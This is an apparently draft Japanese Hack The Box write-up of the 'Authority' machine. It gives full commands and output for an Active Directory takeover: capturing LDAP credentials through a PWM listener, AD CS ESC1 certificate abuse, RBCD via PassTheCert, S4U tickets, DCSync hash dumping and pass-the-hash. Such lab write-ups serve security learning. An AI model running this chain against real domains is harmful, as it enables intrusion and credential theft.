---
title: "[ HTB ] Authority | Writeup"
emoji: "⚖️"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 一応実務でもペネトレーションテストをやっているので、（たまに）実務目線のコメントも挟みます。

### 想定読者

- HTBなどのCTF/ペネトレーションテスト演習に興味がある初学者
- Linuxの基本的なコマンド操作、SMB/LDAP/WinRM/Active Directoryなどについてある程度の前提知識がある方(本記事内でも簡単な用語解説を挟んでいます)

## Machine Profile

Machine Name: Authority
Difficulty: Medium
OS: Windows

https://app.hackthebox.com/machines/Authority

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# echo 'export RHOSTS="10.129.109.167"' | tee -a .zshrc
export RHOSTS="10.129.109.167"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# ping -c 4 ${RHOSTS}
(TODO: pingの出力をここに貼る)
```

## Enumeration

### Nmap

まずはNmapでポートスキャン、兎にも角にもNmap。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nmap -sSV -Pn -n -r -T4 -oN nmap_version.txt ${RHOSTS}
(TODO: nmapの出力をここに貼る)
```

`-sSV`: SYNスキャン＋Versionスキャン  
`-Pn`: Pingチェック無効化  
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る  
`-n`: 名前解決無効化。同じく時短目的  
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み  
`-T4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短  
`-oN`: 結果を保存するファイル名を指定  

---

(TODO: nmap出力を貼ったら、空いているポートの所感をここに書く。今回ポイントになるのは、DCでお馴染みの 53/88/135/139/389/445/464/636/3268... に加えて、`8443` で動いている PWM(HTTPSのパスワード管理アプリ)と、`5985`(WinRM)あたり。)

### PWM(8443)

:::details PWMとは？
読み方: ピーダブリューエム

意味: Active Directory(LDAP)と連携する、オープンソースのパスワード・セルフサービス(セルフでパスワードリセットなどをやらせる)アプリ。ユーザ認証のためにADへLDAPで問い合わせにいく構成を取ることが多く、その「LDAP接続設定」まわりが攻撃対象になりやすい。
:::

`8443`にHTTPSでアクセスすると、PWMのログイン/設定画面が見える。PWMが Configuration(設定)モードで動いていて、設定画面(Configuration Editor)を触れる状態だった。

(TODO: Configuration Editorにたどり着くまでの経緯をここに追記する。ポート8443でPWMを発見した流れ、および設定エディタに入るためのパスワードを入手した過程(SMBの`Development`共有から Ansible のプレイブックを入手 → `defaults/main.yml` 内の Ansible Vault 暗号文字列を `ansible2john` でハッシュ化 → クラック → `ansible-vault decrypt` で PWM 設定パスワードを復号、など)。今回のログには未記録なので、スクショ・コマンドを後で貼る。)

(TODO: 冒頭のPWM設定画面のスクリーンショット3枚を、Zennの`/images/`配下にアップロードしてここに差し込む。)

設定画面を眺めていると、LDAPの接続テスト(保存した接続先へPWMが実際にLDAP接続しにいく)機能を見つけた。接続先は設定で自由に書き換えられる。つまり、接続先を自分のマシンに向けて待ち受けておけば、PWMがLDAPバインドに使っている認証情報が自分のところへ飛んでくるはず、という筋が見える。

### 権限昇格を見据えた下調べ(user取得後に再掲)

(このセクションの詳細は Foothold でシェルを取ってから実施。ここでは「LDAP接続テストでクレデンシャルを抜く」方針が立った、という段階。)

## Foothold

### PWMのLDAP接続テストでクレデンシャルを奪取

:::details LDAPとは？
読み方: エルダップ

正式名称: Lightweight Directory Access Protocol

意味: ディレクトリサービスに対し検索・参照などのやり取りをする際に使うプロトコル/サービス。Windows環境ならActive Directory(AD)が主流で、標準の平文LDAPはTCP 389番を使う。PWMはユーザ認証のためにこのLDAPへバインド(ログイン)しにいく。
:::

やることはシンプルで、攻撃者側の389番で待ち受けておき、PWMのLDAP接続先を自分のIP(tun0)に書き換えて接続テストを実行するだけ。PWMがこちらにバインドしにきた瞬間、設定に保存されたサービスアカウントの認証情報が平文で飛んでくる。

まずは`nc`で389番を開けて待ち受ける。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nc -lnvp 389
listening on [any] 389 ...
```

`-l`: リッスンモード  
`-n`: 名前解決しない  
`-v`: 詳細表示  
`-p 389`: 待ち受けポート指定  

この状態で、PWMのLDAP接続先を自分のVPN(tun0)のIPに書き換え、接続テストを実行する。すると先ほどのリスナーに接続が来て、クレデンシャルが落ちてくる。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nc -lnvp 389
listening on [any] 389 ...
connect to [10.10.16.125] from (UNKNOWN) [10.129.109.167] 64249
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
```

> CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
> lDaP_1n_th3_cle4r!

先頭や途中に制御文字が混じっているが、`svc_ldap`というサービスアカウントのDNと、平文PW`lDaP_1n_th3_cle4r!`がはっきり読み取れる。設定画面上ではマスクされていたPWが、接続先を書き換えるだけであっさり平文で取れてしまった。

```txt:creds.txt
svc_ldap:lDaP_1n_th3_cle4r!
```

### クレデンシャルの検証 → WinRM ログイン

拾ったクレデンシャルが本当に通るか、まずは`nxc`[^1]で確認する。

:::details nxcとは？
読み方: ネットエクスキュート

正式名称: NetExec

意味: SMB/LDAP/WinRMなどのプロトコルに対し認証試行・情報列挙・コマンド実行をいい感じにやってくれるツール群。`CrackMapExec`の後継。末尾に`[+]`が出れば「その資格情報が有効」という合図。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nxc ldap 10.129.109.167 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
LDAP        10.129.109.167  389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.109.167  389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
```

> [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!

`[+]`でクレデンシャルが有効であることが確認できた。`5985`(WinRM)が開いているので、そのまま`evil-winrm`[^2]で対話シェルを狙う。

:::details evil-winrmとは？
読み方: イービル・ウィンアールエム

意味: WinRM経由でWindowsマシンに対話シェルを張るためのツール。ファイルのアップロード/ダウンロードも1コマンドで出来るので攻撃者視点では便利。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# evil-winrm -i 10.129.109.167 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

Evil-WinRM shell v3.9
...
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami
htb\svc_ldap
```

`whoami`が`htb\svc_ldap`を返し、無事にシェルを掌握。デスクトップにフラグがあるので取得する(中身は伏せる)。

```sh
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> dir


    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/17/2026  12:56 PM             34 user.txt

*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> type user.txt
```

:::message
PWMの設定に平文で保存されたLDAP用クレデンシャルを、接続先サーバを攻撃者側にすり替えること(LDAP接続テストの悪用)で平文のまま奪取出来た。原因は「設定エディタを触れる状態で放置されていたこと」と「LDAP接続先を認証なしで書き換えられる設計」。カテゴリとしては設定不備＋認証情報の不適切な管理にあたる。
:::

## Privilege Escalation

### 権限昇格のための列挙

まずは手持ちの`svc_ldap`で軽く周辺を見る。ドメインユーザを確認。

```sh
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> net user

User accounts for \\
-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
svc_ldap
The command completed with one or more errors.
```

Kerberoastingが狙えないかSPNを引いてみるが、空振り。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# impacket-GetUserSPNs authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

WinPEASを上げて一通り眺めたところ、証明書まわり(AD CS)が怪しいという当たりがついた。マシン名が`Authority`で、SMBにも`ADCS`という名前が出てくる構成なので、ここは AD CS(証明書サービス)を疑うのが筋。

:::details AD CS / Certipyとは？
読み方: エーディーシーエス / サーティパイ

意味(AD CS): Active Directory Certificate Services。ADにおける公開鍵基盤(PKI)。証明書テンプレートの設定不備があると、低権限ユーザが「別人になりすませる証明書」を発行できてしまい、ドメイン全体の乗っ取りに繋がる(ESC1〜ESCxと番号付けされた一連の攻撃)。

意味(Certipy): AD CSの列挙・悪用を行うLinux製ツール。脆弱なテンプレートの発見から証明書要求、認証までこれ一本でこなせる。
:::

NetExecの`certipy-find`モジュールでAD CSを列挙する。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nxc ldap 10.129.109.167 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M certipy-find
LDAP        10.129.109.167  389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
CERTIPY-... 10.129.109.167  389    AUTHORITY        Certificate Templates
CERTIPY-... 10.129.109.167  389    AUTHORITY            Template Name                       : CorpVPN
CERTIPY-... 10.129.109.167  389    AUTHORITY            Enabled                             : True
CERTIPY-... 10.129.109.167  389    AUTHORITY            Client Authentication               : True
CERTIPY-... 10.129.109.167  389    AUTHORITY            Enrollee Supplies Subject           : True
CERTIPY-... 10.129.109.167  389    AUTHORITY            Certificate Name Flag               : EnrolleeSuppliesSubject
CERTIPY-... 10.129.109.167  389    AUTHORITY              Enrollment Permissions
CERTIPY-... 10.129.109.167  389    AUTHORITY                Enrollment Rights               : AUTHORITY.HTB\Domain Computers
CERTIPY-... 10.129.109.167  389    AUTHORITY            [!] Vulnerabilities
CERTIPY-... 10.129.109.167  389    AUTHORITY              ESC1
```

(TODO: `certipy-find`の出力は長いので、必要なら全文を貼る。ここでは要点だけ抜粋。)

> Enrollee Supplies Subject : True
> Enrollment Rights : AUTHORITY.HTB\Domain Computers
> [!] Vulnerabilities : ESC1

`CorpVPN`テンプレートが ESC1 に該当していた。

:::details ESC1とは？
読み方: イーエスシーワン

意味: 「低権限のプリンシパルが申請できる」「申請者が証明書のサブジェクト(SAN)を自由に指定できる(Enrollee Supplies Subject)」「クライアント認証に使えるEKUを持つ」が揃った、脆弱な証明書テンプレート。申請時にSANへ`administrator`を指定すれば、Administratorになりすませる証明書を発行できてしまう。
:::

ただし今回は申請権限(Enrollment Rights)が`Domain Computers`に付いている。`svc_ldap`はユーザアカウントなので、このままでは申請できない。コンピュータアカウントとして申請する必要がある。

そこで`MachineAccountQuota`を確認する。これは「一般ユーザが何台までコンピュータアカウントを追加できるか」の値で、デフォルトの`10`なら自前でコンピュータを作れる。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nxc ldap 10.129.109.167 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
MAQ         10.129.109.167  389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.109.167  389    AUTHORITY        MachineAccountQuota: 10
```

> MachineAccountQuota: 10

デフォルトの`10`なので、コンピュータアカウントの追加が出来る。攻撃の筋道を整理するとこう。

1. 自分で支配するコンピュータアカウントを1つ追加する(申請権限の`Domain Computers`に化けるため)
2. そのコンピュータで`CorpVPN`に申請し、SANに`administrator`を指定した証明書を発行させる(ESC1)
3. 得たAdministrator証明書で、LDAPSにSchannel認証してRBCDを仕込み、Administratorになりすましてドメインを掌握する

### コンピュータアカウントの追加

NetExecの`add-computer`モジュールでコンピュータアカウントを追加する。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nxc smb 10.129.109.167 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M add-computer -o NAME="VICTIM1" PASSWORD="VICTIM1"
SMB         10.129.109.167  445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
ADD-COMP... 10.129.109.167  445    AUTHORITY        Successfully added the machine account: 'VICTIM1$' with Password: 'VICTIM1'
```

ところが、この`VICTIM1$`で証明書を要求すると`ACCESS_DENIED`〜`DCE RPC fault 00000721`で延々と失敗した。

:::details なぜ証明書要求が失敗したのか(0x721)
`0x721`は`RPC_S_SEC_PKG_ERROR`(認証まわりのエラー)。原因はコンピュータアカウントのパスワードがドメインのパスワードポリシー違反だったこと。`VICTIM1$`にパスワード`VICTIM1`は、短すぎる＆「パスワードにアカウント名を含めてはいけない」という複雑性要件に引っかかる。アカウント作成自体は通っても、その後のCAへの認証付きRPCが正常に確立できず、中途半端な失敗になる。

マシンアカウントは本来ランダムで長いパスワードを持つ前提なので、人間が付けた短い文字列だとこういう形で詰まりやすい。長く複雑な(＝ポリシー準拠の)パスワードで作り直せば解決する。
:::

ということで、強いパスワードで作り直す。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# nxc smb 10.129.109.167 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M add-computer -o NAME="VICTIM2" PASSWORD="8KaaUeDn#eAO^Q4Q"
SMB         10.129.109.167  445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
ADD-COMP... 10.129.109.167  445    AUTHORITY        Successfully added the machine account: 'VICTIM2$' with Password: '8KaaUeDn#eAO^Q4Q'
```

### ESC1 で Administrator 証明書を発行させる

作った`VICTIM2$`で`CorpVPN`に申請し、SAN(`-upn`)に`administrator@authority.htb`を指定する。`Enrollee Supplies Subject`が有効なので、CAは「中身はAdministrator」という証明書を発行してしまう。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# certipy-ad req -u 'VICTIM2$@authority.htb' -p '8KaaUeDn#eAO^Q4Q' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dns authority.htb -dc-ip 10.129.109.167
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[+] Connected to endpoint: ncacn_np:10.129.109.167[\pipe\cert]
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Saving certificate and private key to 'administrator_authority.pfx'
```

> UPN: 'administrator@authority.htb'
> Saving certificate and private key to 'administrator_authority.pfx'

UPNが`administrator@authority.htb`の証明書(`administrator_authority.pfx`)が取れた。

:::message
`CorpVPN`テンプレートが ESC1(申請者がSANを自由指定でき、クライアント認証可能)に該当していたため、`administrator`になりすませる証明書を発行出来た。さらに`MachineAccountQuota`がデフォルトの`10`のままだったため、申請に必要なコンピュータアカウントを自前で用意出来てしまった。カテゴリとしては脆弱な証明書テンプレート(設定不備)＋デフォルト設定の放置にあたる。
:::

### Pass-the-Cert で RBCD を書き込む

証明書から直接TGTを取る方法(`certipy auth`/PKINIT)もあるが、ここでは証明書を使ってLDAPSにSchannelで「Administratorとして」認証し、RBCD(リソースベース制約付き委任)を仕込む PassTheCert[^3] ルートを採った。

:::details RBCD / PassTheCertとは？
読み方: アールビーシーディー / パス・ザ・サート

意味(RBCD): Resource-Based Constrained Delegation。あるコンピュータの`msDS-AllowedToActOnBehalfOfOtherIdentity`に「このアカウントは他ユーザになりすまして良い」と書き込むと、そのアカウントがS4Uで任意ユーザのチケットを代理取得できるようになる委任方式。

意味(PassTheCert): 証明書(.crt/.key)でLDAPSにSchannel認証し、ADオブジェクトを書き換えるツール。PKINITが使えない/塞がれている環境でも、証明書の持ち主の権限でLDAP操作ができる。
:::

まず`.pfx`から`.key`と`.crt`をOpenSSLで取り出す。

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# openssl pkcs12 -in administrator_authority.pfx -nocerts -out admin.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

┌──(root㉿5602a1b7889d)-[~/Authority]
└─# openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out admin.cert
Enter Import Password:
```

取り出した証明書でPassTheCertを実行し、自分の手駒`VICTIM2$`にDC(`AUTHORITY$`)へのRBCDを付与する。ここでのLDAPS認証は証明書の主体(Administrator)として通るので、特権での書き込みが成立する。

```sh
┌──(root㉿5602a1b7889d)-[~/Git/PassTheCert/Python]
└─# python3 passthecert.py -port 636 -action write_rbcd -domain authority.htb -delegate-from 'VICTIM2$' -delegate-to 'AUTHORITY$' -dc-ip 10.129.109.167 -crt ~/HTB/Authority/admin.cert -key ~/HTB/Authority/admin.key
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Enter PEM pass phrase:
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] VICTIM2$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     VICTIM2$     (S-1-5-21-622327497-3269355298-2248959698-12103)
```

> [*] Delegation rights modified successfully!
> [*] VICTIM2$ can now impersonate users on AUTHORITY$ via S4U2Proxy

`VICTIM2$`がDCに対して任意ユーザをなりすませる状態になった。

### S4U で Administrator のチケットを取得 → DCSync

RBCDが入ったので、`impacket-getST`で`VICTIM2$`を使い、Administratorになりすましたサービスチケットを取得する。

:::details S4U / getSTとは？
読み方: エスフォーユー

意味: S4U2Self + S4U2Proxy という Kerberos の拡張を使い、委任権を持つアカウントが「任意ユーザになりすましたサービスチケット」を取得する仕組み。`impacket-getST`の`-impersonate`でなりすまし対象を指定する。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Git/PassTheCert/Python]
└─# impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/VICTIM2$:8KaaUeDn#eAO^Q4Q'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache
```

取得したチケットを使ってDCSync(`secretsdump`)で全アカウントのNTLMハッシュを抜く。

:::details DCSync / secretsdumpとは？
読み方: ディーシーシンク

意味: ドメインコントローラの複製(レプリケーション)機能を悪用し、NTDS.ditのパスワードハッシュを引き出す手法。`impacket-secretsdump`の`-just-dc-ntlm`でNTLMハッシュだけに絞って取得できる。`-k -no-pass`で、取得済みのKerberosチケット(ccache)を使って認証する。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# export KRB5CCNAME='Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache'

┌──(root㉿5602a1b7889d)-[~/Authority]
└─# impacket-secretsdump authority.htb/Administrator@authority.authority.htb -just-dc-ntlm -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:9077cb5a6e026a55f0e9984fe8d023c6:::
[*] Cleaning up...
```

### 管理者権限の確認 → root.txt

AdministratorのNTハッシュが取れたので、Pass-the-Hashで`evil-winrm`にログインする。

:::details Pass-the-Hashとは？
読み方: パス・ザ・ハッシュ

意味: 平文パスワードの代わりにNTLMハッシュをそのまま認証に使う手法。NTLM認証はハッシュさえあれば成立するため、ハッシュを渡すだけでそのユーザとしてログインできる。`evil-winrm`の`-H`でハッシュを指定する。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Authority]
└─# evil-winrm -i 10.129.109.167 -u Administrator -H 6961f422924da90a6928197429eea4ed

Evil-WinRM shell v3.9
...
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

> *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
> htb\administrator

`whoami`が`htb\administrator`を返し、ドメイン管理者権限を掌握。`Administrator`のデスクトップから`root.txt`を取得する(中身は伏せる)。

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

:::message
ESC1(脆弱な証明書テンプレート)で発行したAdministrator証明書を使い、PassTheCertでSchannel認証 → DC(`AUTHORITY$`)にRBCDを書き込み → S4UでAdministratorのチケットを取得 → DCSyncでNTハッシュ奪取、という流れでドメインを掌握した。根っこは「証明書テンプレートの設定不備(ESC1)」と「MachineAccountQuotaが既定値のまま」。カテゴリとしては設定不備＋デフォルト設定の放置にあたる。
:::

## まとめ

1. Nmapで、DCのポート群に加えて`8443`(PWM)や`5985`(WinRM)が開いていることを確認
2. PWMが設定モードで動いており、LDAP接続テスト機能の接続先を自分のIPに書き換え → `nc`で待ち受けて`svc_ldap`の平文PW(`lDaP_1n_th3_cle4r!`)を奪取
3. `nxc`でクレデンシャルの有効性を確認し、`evil-winrm`で`svc_ldap`としてログイン(user.txt)
4. AD CSを`certipy-find`で列挙 → `CorpVPN`テンプレートが ESC1 に該当(ただし申請権限は`Domain Computers`)
5. `MachineAccountQuota=10`を確認し、コンピュータアカウントを追加(弱いPWだと`0x721`で失敗するので強いPWで作成)
6. ESC1で、SANに`administrator`を指定した証明書を発行(`administrator_authority.pfx`)
7. OpenSSLで`.crt`/`.key`を取り出し、PassTheCertで`VICTIM2$`にDCへのRBCDを付与
8. `impacket-getST`でAdministratorになりすましたチケットを取得し、DCSyncでNTハッシュを奪取
9. AdministratorのNTハッシュでPass-the-Hashログインし、`root.txt`を取得

PWMの設定不備で足がかりを得て、AD CSのESC1 → PassTheCert/RBCDでドメイン管理者まで、という王道のAD攻略。証明書テンプレートの設定不備やMachineAccountQuotaの放置は実務でも刺さりやすいポイントで、Medium相応に学びの多いマシンだった。
特に、短いPWのコンピュータアカウントでハマる`0x721`は初見だとまず原因が分からないので、パスワードポリシーを疑う、という引き出しが一つ増えたのが収穫。

ちなみにHTBなのでやらないですが、実務では後始末(追加したコンピュータアカウントやRBCD設定の原状復帰など)もやっています。

## 免責事項

- 本記事はセキュリティ学習・知識共有を目的としています。
- 記載しているコマンド・攻撃手法は、自分が管理する環境、または明示的に許可を得た環境でのみ実行してください。他者の環境に無断で使用した場合、不正アクセス禁止法などの法令に抵触する可能性があります。
- 本記事の内容によって生じたいかなる損害についても、筆者は責任を負いかねます。

## HTBのポリシーについて

Hack The Boxでは、Retired状態のマシンに限りWriteupの公開が認められています。Activeなマシンの解法を公開する行為は利用規約違反にあたるため、本記事の対象マシンは執筆時点でRetiredであることを確認しています。

[^1]: https://github.com/Pennyw0rth/NetExec
[^2]: https://github.com/Hackplayers/evil-winrm
[^3]: https://github.com/AlmondOffSec/PassTheCert
